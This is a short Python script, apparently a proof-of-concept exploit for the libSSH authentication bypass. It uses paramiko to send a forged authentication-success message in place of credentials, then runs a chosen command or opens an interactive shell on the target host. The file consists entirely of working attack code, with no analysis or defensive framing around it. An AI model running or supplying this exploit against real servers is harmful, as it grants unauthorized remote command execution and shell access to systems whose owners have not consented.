#!/usr/bin/env python3
import paramiko
import socket
import argparse
from sys import exit


parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='Host', default="192.168.1.10")
parser.add_argument('-p', '--port', help='libSSH port', default=22)
parser.add_argument('-c', '--command', help='Command to execute', default='shell')
parser.add_argument('-log', '--logfile', help='Logfile to write conn logs', default="paramiko.log")

args = parser.parse_args()


def BypasslibSSHwithoutcredentials(hostname, port, command):
    
    sock = socket.socket()
    try:
        sock.connect((str(hostname), int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
  
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
    
        spawncmd = transport.open_session(timeout=10)

        if command != "shell":
            spawncmd.exec_command(command)
            out = spawncmd.makefile("rb", 2048)
            output = out.read()
            out.close()
            print(output)
        else:
            print("Invoking shell...")
            spawncmd.invoke_shell()
        
        return 0
    
    except paramiko.SSHException as e:
        print("Administratively prohibited : `\"Channel Not Opened\" or \"TCPForwarding disabled on remote/local server can't connect.\".Not Vulnerable")
        return 1
    except socket.error as err:
        print("Unable to connect to " + str(hostname))
        print("Error: " + str(err))
        return 1


def main():
    paramiko.util.log_to_file(args.logfile)
    try:
        hostname = args.host
        port = args.port
        command = args.command
    except:
        parser.print_help()
        exit(1)
    BypasslibSSHwithoutcredentials(hostname, port, command)

if __name__ == '__main__':
    exit(main())
